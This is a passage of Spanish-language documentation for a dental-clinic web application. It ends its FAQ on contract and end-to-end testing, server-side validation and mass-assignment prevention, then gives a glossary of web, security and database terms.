mostraría un día antes. Con `dateStrings: true` llega `'1990-02-14'`, tal como está en la base y
como lo tenía el mock.

**P97. ¿Cómo comprobaron que el frontend funciona con el backend sin cambiar las pantallas?**
R: Con tres tipos de pruebas:
- **De contrato** (`tests/backend/api.test.mjs`): el `user` del login es idéntico, rol por rol, al
  que arma el mock, y el listado tiene las mismas columnas y el mismo orden.
- **De la API**: 79 casos contra MariaDB 10.4 y MySQL 8.0.
- **E2E en Edge** con `USE_MOCK = false`: login, listado, registro con el 409 junto al campo, token
  alterado que manda al login y cierre de sesión.

El servidor de pruebas entrega `config.js` con el interruptor apagado, sin editar el archivo.

**P98. ¿Por qué el backend valida otra vez lo que ya valida el formulario?**
R: Porque el formulario se puede saltar: Postman, `curl` o la consola del navegador envían lo que
quieran. El formulario valida para **ayudar** al usuario y el servidor valida para **proteger** los
datos. Usamos las mismas reglas y mensajes en los dos para que el usuario no note la diferencia. Y
detrás queda la base con sus `CHECK` y llaves (§15.3).

**P99. ¿Qué es la asignación masiva y cómo la evitan?**
R: Es enviar campos que el cliente no debería poder escribir, por ejemplo `id_usuario` para
vincular un paciente a otra cuenta, o `fecha_registro`. Si el controlador hiciera
`INSERT … SET ?` con todo el `req.body`, entrarían. `pick()` copia solo las 12 columnas permitidas
y el `INSERT` usa una lista fija de columnas. Hay una prueba que envía esos campos y comprueba que
se ignoran.

---

## 19. Glosario

| Término | Definición breve |
|---|---|
| **a11y** | Abreviatura de *accessibility* (a + 11 letras + y) |
| **AbortController** | API del navegador para cancelar un `fetch` (la usamos como tiempo límite) |
| **aria-busy** | Indica que una región se está actualizando; el lector espera a que termine |
| **Asignación masiva** | Ataque que envía campos que el cliente no debería poder escribir; se evita con una lista blanca (`pick()`) |
| **Ataque de tiempo** | Deducir información midiendo cuánto tarda una operación |
| **BEM** | Convención de nombres CSS: Bloque__Elemento--Modificador |
| **Barrel** | Archivo `index.js` que reexporta los módulos de una carpeta |
| **bcrypt** | Algoritmo de hash de contraseñas lento y con sal; el backend lo usa con `bcryptjs` (costo 10) |
| **bfcache** | Caché del navegador que guarda la página entera para el botón "Atrás" sin volver a ejecutar sus scripts |
| **Bearer token** | Token que se envía en el encabezado `Authorization` para identificar la sesión ante la API |
| **Breadcrumbs (migas de pan)** | Ruta jerárquica hasta la página actual: Inicio › Pacientes › Andrés |
| **Closure** | Función que "recuerda" las variables del lugar donde se creó; así guardamos el estado de cada componente |
| **Condición de carrera** | Error que aparece cuando el resultado depende de qué operación asíncrona termina primero |
| **Container query** | Estilos según el ancho del contenedor, no de la ventana |
| **Contexto seguro** | Página servida por `https`, `localhost` o `127.0.0.1`; requisito de Web Crypto |
| **Debounce** | Esperar a que un evento deje de repetirse antes de actuar |
| **Defensa en profundidad** | Varias capas de protección; si una falla, la siguiente detiene el ataque |
| **Design token** | Variable de diseño con nombre (color, espacio, radio…) |
| **Disclosure** | Patrón de botón que muestra u oculta un panel |
| **dvh** | Alto dinámico de la ventana: descuenta las barras del navegador móvil |
| **Enumeración de usuarios** | Averiguar qué cuentas existen por las diferencias en mensajes o tiempos de respuesta |
| **ES Modules** | Sistema nativo de `import`/`export` de JavaScript (requiere servidor, por eso Live Server) |
| **FDI** | Sistema internacional de numeración dental de dos dígitos |
| **Guard** | Función que se ejecuta al abrir una página y redirige si no hay sesión o el rol no tiene acceso |
| **Hash** | Resumen de un solo sentido de un dato; no se puede revertir (a diferencia del cifrado) |
| **Idempotente** | Operación que da el mismo resultado si se ejecuta una o varias veces |
| **Landmark** | Región de la página (banner, navigation, main…) a la que el lector de pantalla puede saltar |
| **localStorage** | Almacenamiento clave-valor del navegador que persiste entre recargas (≈5 MB por origen) |
| **Actualización optimista** | Mostrar un cambio en pantalla antes de que el servidor lo confirme, y revertirlo si falla |
| **CDP (Chrome DevTools Protocol)** | Protocolo para controlar Edge/Chrome desde un programa; lo usan las pruebas E2E |
| **DRY** | *Don't Repeat Yourself*: no duplicar código; aquí, un controlador compartido entre roles |
| **E2E (de punta a punta)** | Prueba que usa la aplicación completa en un navegador, como lo haría una persona |
| **Flaky (intermitente)** | Prueba que a veces pasa y a veces falla sin cambios en el código |
| **Minimización de datos** | Entregar a cada pantalla solo los datos que necesita (p. ej. `ocupacion()` sin pacientes) |
| **Mock** | Datos de prueba que imitan los reales mientras no existe el backend |
| **PBKDF2** | Algoritmo de derivación de claves (hash lento con sal e iteraciones), nativo en Web Crypto |
| **Redirección abierta** | Vulnerabilidad que usa un parámetro de la URL para enviar al usuario a un sitio externo |
| **Reflow** | Recálculo del layout que hace el navegador |
| **replaceState** | Cambia la URL sin agregar una entrada al historial del navegador |
| **Rollback** | Deshacer los cambios de una operación que falló, dejando los datos como estaban |
| **Roving tabindex** | Solo un elemento del grupo es tabulable; las flechas mueven el foco dentro del grupo |
| **Sal (salt)** | Bytes aleatorios por usuario que se mezclan con la contraseña antes del hash |
| **Service Layer** | Capa que separa la vista de la fuente de datos; las páginas piden, el servicio sabe de dónde sacar |
| **Skip link** | Enlace inicial "Saltar al contenido principal" para usuarios de teclado |
| **Slot** | Hueco de un template que la página llena con su contenido |
| **structuredClone** | Copia profunda nativa de un objeto; evita modificar la base simulada por referencia |
| **Template** | Estructura de una pantalla sin datos (nivel 4 de Atomic Design) |
| **WAI-ARIA** | Especificación del W3C de roles y atributos para accesibilidad |
| **Web Crypto** | API criptográfica nativa del navegador (`crypto.subtle`, `crypto.getRandomValues`) |
| **XSS** | Cross-Site Scripting: inyección de scripts maliciosos |
| **API REST pública** | Servicio web que cualquiera puede consultar por HTTP y devuelve datos (aquí, JSON) |
| **CORS** | Regla del navegador que impide leer respuestas de otro origen salvo que el servidor lo permita (`Access-Control-Allow-Origin`) |
| **Degradación elegante** | Si falla una función opcional (la TRM), el resto de la página sigue funcionando |
| **DIVIPOLA** | Codificación oficial del DANE de departamentos (2 dígitos) y municipios (5 dígitos) |
| **Import dinámico** | `import('ruta')` dentro del código: descarga el módulo solo cuando se necesita |
| **Inyección de dependencias** | Pasar desde fuera lo que una función usa (`fetch`, reloj, almacenamiento) para poder reemplazarlo en las pruebas |
| **Preflight** | Petición `OPTIONS` que el navegador hace antes de una petición CORS "no simple" |
| **Respaldo (fallback)** | Fuente alternativa cuando la principal falla: caché, otra API o datos locales |
| **Socrata / SoQL** | Plataforma de datos abiertos de `datos.gov.co` y su lenguaje de consulta parecido a SQL (`$select`, `$where`…) |
| **Timeout (tiempo límite)** | Tiempo máximo de espera de una petición antes de cancelarla |
| **TRM** | Tasa Representativa del Mercado: pesos colombianos por 1 dólar, certificada a diario por la Superintendencia Financiera |
| **TTL** | *Time To Live*: cuánto tiempo se considera vigente un dato en caché |
| **CHECK (restricción)** | Condición que la base exige a cada fila antes de guardarla; si no se cumple, rechaza el `INSERT`/`UPDATE` (MySQL ≥ 8.0.16, MariaDB ≥ 10.2) |
| **Columna generada** | Columna que la base calcula con una fórmula sobre otras de la misma fila (`GENERATED ALWAYS AS … STORED`); no se escribe a mano |
| **Commit implícito** | Las sentencias DDL (`ALTER`, `CREATE`, `DROP`) se confirman solas en MySQL: `ROLLBACK` no las deshace |
| **DDL / DML** | *Data Definition Language* (cambia la estructura: `CREATE`, `ALTER`) / *Data Manipulation Language* (cambia los datos: `INSERT`, `UPDATE`, `DELETE`) |
| **Falso positivo (en pruebas)** | Prueba que dice "pasó" cuando en realidad no comprobó nada; se detecta saboteando la prueba a propósito |
| **Llave foránea (FK)** | Columna que debe apuntar a una fila existente de otra tabla; la base impide referencias rotas |
| **Migración** | Script que lleva una base de una versión a otra **conservando sus datos** (`ALTER`, `UPDATE`) |
| **mysqldump** | Herramienta que exporta una base (estructura y datos) a un archivo `.sql`; sirve de copia de seguridad |
| **Normalización / redundancia** | Diseñar las tablas para que cada hecho se guarde **una sola vez**; guardarlo dos veces (redundancia) permite que se contradiga |
| **Transacción** | Grupo de operaciones que se aplican todas o ninguna (`START TRANSACTION` … `COMMIT` / `ROLLBACK`) |
| **API REST propia** | Servidor que expone recursos (`/api/pacientes`) con métodos HTTP (`GET` lee, `POST` crea…) y responde JSON |
| **Consulta parametrizada** | SQL con `?` cuyos valores viajan aparte; impide la inyección SQL |
| **Controlador** | Función que atiende una ruta: valida, decide y llama al modelo |
| **Express** | *Framework* mínimo de Node.js para servidores HTTP: rutas y *middlewares* |
| **HMAC** | Firma con una clave secreta; la del JWT (`HS256`) prueba que el contenido no se alteró |
| **JWT (JSON Web Token)** | Token firmado `encabezado.contenido.firma`; se puede leer pero no modificar sin el secreto |
| **Middleware** | Función que corre antes del controlador y puede dejar pasar (`next()`) o cortar la petición |
| **Modelo** | Módulo que solo ejecuta SQL contra una tabla |
| **Pool de conexiones** | Conjunto de conexiones abiertas a la base que se prestan y devuelven entre peticiones |
| **Prueba de contrato** | Comprueba que dos partes (mock y API) responden con la misma forma |
| **Variable de entorno (`.env`)** | Configuración fuera del código (credenciales, secretos) que cambia por equipo y no va a git |
| **201 / 401 / 403 / 409 / 503** | Creado · sin sesión válida · sin permiso · conflicto (duplicado) · servicio no disponible |
